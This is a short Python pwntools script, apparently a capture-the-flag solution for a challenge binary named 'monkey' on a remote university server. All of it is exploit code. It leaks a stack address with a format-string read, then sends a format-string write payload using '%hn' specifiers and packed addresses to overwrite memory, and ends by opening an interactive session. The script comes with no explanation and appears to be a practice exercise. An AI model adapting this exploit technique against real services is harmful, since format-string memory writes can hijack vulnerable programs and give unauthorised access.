from pwn import *

ip = "bamboofox.cs.nctu.edu.tw"
port = 11000
r = remote(ip,port)

elf = 'monkey' 
#r = process("./"+elf)

context.arch = 'i386'

offset = 7

# 0x3132 000a
# 0x000a = 10
# 0x3132 = 12594
# 12584

#exploit = "%19$p".ljust( 0x30 , 'a' )+p32(0xdeadbeef)
get_addr = "%269$p"
# 0x30 = 48 
# 32bit => 48/4= 12  7+12=19

#raw_input("AAAA")
r.recvuntil("choice!\n")
r.sendline("2")
r.recvuntil("out.\n")
r.sendline(get_addr)


addr =  int(r.recv()[0:10],16)
banana = addr + 4

r.sendline("2")
r.recvuntil("out.\n")

exploit = "%10c%19$hn%12584c%20$hn".ljust( 0x30 , 'a' )+p32(banana)+p32(banana+2)
r.sendline(exploit)
r.recvuntil("choice!\n")
r.sendline("3")
r.interactive()
